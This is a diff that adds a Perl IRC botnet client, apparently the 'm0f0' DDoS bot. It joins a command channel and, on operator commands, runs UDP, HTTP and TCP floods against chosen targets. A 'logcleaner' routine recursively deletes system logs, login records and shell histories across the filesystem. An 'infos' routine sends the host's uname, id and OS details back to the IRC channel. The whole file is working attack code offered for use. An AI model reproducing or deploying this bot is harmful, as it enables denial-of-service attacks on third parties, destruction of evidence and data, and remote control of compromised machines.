@@ -1,0 +1,231 @@
+#!/usr/bin/perl -w
+use IO::Socket::INET;
+use HTTP::Request;
+use LWP::UserAgent;
+use LWP::Simple;
+use URI::Escape;
+
+print q{
+-------------------------------
+              _____      
+_____   _____/ ____\____  
+/     \ /  _ \   __\/  _ \
+|  Y Y  (  <_> )  | (  <_> )
+|__|_|  /\____/|__|  \____/
+    \/                    
+-------------------------------
+\\ m0f0 ddos priv8 by t0fx  //
+\\ credits to pitbull bot //
+\\  europasecurity.org  //
+ \\  spam.ws //
+  \\------------------//
+
+};
+#= CONFIGURATION =========================================#
+my $server = "irc.mindforge.org";                       #
+my $nick  = "[STeam][" . int( rand(9999) ) . "]";          #
+my $port = "6667";                                        #
+my $channel = "#DeBuG";                                   #
+#= END OF CONFIGURATION ==================================#
+
+my $name     = "STeam 8 *  : STeam";  
+print "\n";
+print "\n [+] Connecting to $server\n";
+$connection = IO::Socket::INET->new(PeerAddr=>"$server",
+                                  PeerPort=>"$port",
+                                  Proto=>'tcp',
+                                  Timeout=>'30') or die " [-] Couldnt connect to $server\n";
+print " [+] Connected to $server\n\n";                    
+print $connection "USER $name\n";
+print $connection "NICK $nick\r\n";
+
+while($response = <$connection>)
+
+{
+
+   print $response;  #print IRC Response
+   if($response =~ m/:(.*) 00(.*) (.*) :/){print $connection "JOIN ".$channel."\r\n";}
+   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!help/){&help;}    
+   if($response =~ m/^PING (.*?)$/gi){print $connection "PONG ".$1."\r\n";}  
+   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!die/){&diebastard;}
+   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!logcleaner/){&logcleaner;}
+   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!infos/){&infos;}
+   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
+print $connection "PRIVMSG $channel :6|6.:12UDP DDos6:.6|12 Attacking 6 ".$3." 12 with 6 ".$4." 12  packets during 6 ".$5." 12 seconds.\r\n";
+my ($dtime, % packets) =  udpflooder("$3", "$4", "$5");
+$dtime = 1 if $dtime == 0;
+my %bytes;  
+$bytes{igmp} = $4 * $packets{igmp};
+$bytes{icmp} = $4 * $packets{icmp};  
+$bytes{o} = $4 * $packets{o};
+$bytes{udp} = $4 * $packets{udp};  
+$bytes{tcp} = $4 * $packets{tcp};
+print $connection "PRIVMSG $channel :6|6.:12UDP DDos6:.6|12 Results6  ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 12KB in6  ".$dtime." 12seconds 6 ".$3.".\r\n";
+}
+
+   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!httpflood\s+(.*)\s+(\d+)/) {  
+print $connection "PRIVMSG $channel :6|6.:6HTTP DDos6:.6|12  Attacking 6 ".$3." 12 on port 80 during6 ".$4." 12 seconds .\r\n";
+my $itime  = time;
+my ($cur_time);
+$cur_time = time - $itime;
+while  ($4>$cur_time){
+$cur_time = time - $itime;
+my $socket =  IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$3, PeerPort=>80);
+print $socket "GET / HTTP/1.0\r\nAccept: */*\r\nHost: ".$3." \r\nConnection:  Keep-Alive\r\n\r\n";
+close($socket);
+}
+print $connection "PRIVMSG $channel :6|6.:6HTTP DDos6:.6|12 Attack finished 6 ".$3.".\r\n";  
+}
+
+   if($response =~ m/:(.*)!(.*) PRIVMSG $channel :!tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
+print $connection "PRIVMSG $channel :6|6.:11TCP DDos6:.6|12 Attacking 6 ".$3.":".$4." 12during 6 ".$5."  12seconds.\r\n";
+my $itime = time;
+my ($cur_time);
+$cur_time =  time - $itime;
+while ($5>$cur_time){
+$cur_time = time - $itime;  
+&tcpflooder("$3","$4","$5");
+}  
+print $connection "PRIVMSG $channel :6|6.:11TCP DDos6:.6|  12Attack finished 6 ".$3.":".$4.".\r\n";
+}
+
+}
+
+################################################################################&#8203;############
+sub diebastard
+{
+   print $connection "PRIVMSG $channel :8,1 Quitting... \r\n";
+          exec("pkill perl https.pl \n");  
+}
+################################################################################&#8203;############
+sub help
+{
+   my $asker = $1;
+print $connection "PRIVMSG $channel :6$asker 11[!] Help :\r\n";
+print $connection "PRIVMSG $channel :6|6.:12HTTP DDos6:.6| 11!httpflood <IP> <duration>\r\n";  
+print $connection "PRIVMSG $channel :6|6.:12UDP DDos6:.6| 11!udpflood <IP> <Packet size> <duration>\r\n";  
+print $connection "PRIVMSG $channel :6|6.:12TCP DDos6:.6| 11!tcpflood <IP> <Port> <duration>\r\n";  
+print $connection "PRIVMSG $channel :6|6.:12Log Cleaner6:.6| 11!logcleaner\r\n";
+print $connection "PRIVMSG $channel :6|6.:12Infos6:.6| 11!infos\r\n";
+
+}
+################################################################################&#8203;############
+sub logcleaner
+{
+   my $asker = $1;
+       print $connection "PRIVMSG $channel :6$asker 11[!] Cleaning started\r\n";
+      system 'rm -rf  /var/log/lastlog';
+      system 'rm -rf /var/log/wtmp';
+      system 'rm -rf  /etc/wtmp';
+      system 'rm -rf /var/run/utmp';
+      system 'rm -rf  /etc/utmp';
+      system 'rm -rf /var/log';
+      system 'rm -rf /var/logs';  
+      system 'rm -rf /var/adm';
+      system 'rm -rf /var/apache/log';
+      system 'rm -rf /var/apache/logs';
+      system 'rm -rf /usr/local/apache/log';  
+      system 'rm -rf /usr/local/apache/logs';
+      system 'rm -rf  /root/.bash_history';
+      system 'rm -rf /root/.ksh_history';  
+       print $connection "PRIVMSG $channel :6$asker 11[!] File Log bash_history Cleaned\r\n";
+      sleep 1;  
+       print $connection "PRIVMSG $channel :6$asker 11[!] Cleaning files\r\n";
+      system 'find  / -name *.bash_history -exec rm -rf {} \;';
+      system 'find / -name  *.bash_logout -exec rm -rf {} \;';
+      system 'find / -name "log*" -exec rm  -rf {} \;';
+      system 'find / -name *.log -exec rm -rf {} \;';
+      sleep 1;
+       print $connection "PRIVMSG $channel :6$asker 11[!] Cleaning Successfull\r\n";
+   
+}
+
+################################################################################&#8203;############
+sub  udpflooder {
+my $iaddr = inet_aton($_[0]);
+my $msg = 'A' x $_[1];
+my  $ftime = $_[2];
+my $cp = 0;
+my (% packets);
+$packets{icmp} =  $packets{igmp} = $packets{udp} = $packets{o} = $packets{tcp} = 0;  
+socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
+socket(SOCK2, PF_INET,  SOCK_DGRAM, 17) or $cp++;
+socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;  
+socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
+return(undef) if $cp == 4;  
+my $itime = time;
+my ($cur_time);
+while ( 1 ) {
+for (my $fport =  1;
+$fport <= 65000; $fport++) {
+$cur_time = time - $itime;
+last  if $cur_time >= $ftime;
+send(SOCK1, $msg, 0, sockaddr_in($fport, $iaddr))  and $packets{igmp}++;
+send(SOCK2, $msg, 0, sockaddr_in($fport, $iaddr)) and  $packets{udp}++;
+send(SOCK3, $msg, 0, sockaddr_in($fport, $iaddr)) and  $packets{icmp}++;
+send(SOCK4, $msg, 0, sockaddr_in($fport, $iaddr)) and  $packets{tcp}++;
+
+
+for (my $pc = 3;
+$pc <= 255;$pc++) {  
+next if $pc == 6;
+$cur_time = time - $itime;
+last if $cur_time >=  $ftime;
+socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
+send(SOCK5, $msg,  0, sockaddr_in($fport, $iaddr)) and $packets{o}++;
+}
+}
+last if  $cur_time >= $ftime;
+}
+return($cur_time, % packets);
+}
+################################################################################&#8203;############
+sub tcpflooder {
+my $itime = time;  
+my ($cur_time);
+my ($ia,$pa,$proto,$j,$l,$t);
+$ia=inet_aton($_[0]);  
+$pa=sockaddr_in($_[1],$ia);
+$ftime=$_[2];  
+$proto=getprotobyname('tcp');
+$j=0;$l=0;
+$cur_time = time - $itime;  
+while ($l<1000){
+$cur_time = time - $itime;
+last if $cur_time  >= $ftime;
+$t="SOCK$l";
+socket($t,PF_INET,SOCK_STREAM,$proto);  
+connect($t,$pa)||$j--;
+$j++;$l++;
+}
+$l=0;
+while  ($l<1000){
+$cur_time = time - $itime;
+last if $cur_time >= $ftime;  
+$t="SOCK$l";
+shutdown($t,2);
+$l++;
+}
+}
+################################################################################&#8203;############
+
+################################################################################&#8203;############
+sub infos
+{      
+my $uname=`uname  -a`;
+my $uptime=`uptime`;
+my $ownd=`pwd`;
+my $distro=`cat /etc/issue`;
+my $id=`id`;
+my $un=`uname  -sro`;
+my $asker = $1;
+print $connection "PRIVMSG $channel :6$asker 5[!] System infos :\r\n";
+print $connection "PRIVMSG $channel :6|6.:12Bot Info6:.6| 12Bot version     : 11 m0f0 v1 by t0fx\r\n";
+print $connection "PRIVMSG $channel :6|6.:12System Info6:.6| 12Uname -a     : 11 $uname\r\n";  
+print $connection "PRIVMSG $channel :6|6.:12System Info6:.6| 12Uptime       : 11  $uptime\r\n";  
+print $connection "PRIVMSG $channel :6|6.:12System Info6:.6| 12ID           : 11 $id\r\n";  
+print $connection "PRIVMSG $channel :6|6.:12System Info6:.6| 12Directory      : 11  $ownd\r\n"; ;
+print $connection "PRIVMSG $channel :6|6.:12System Info6:.6| 12OS           : 11 $distro\r\n";  
+
+}
+################################################################################&#8203;############
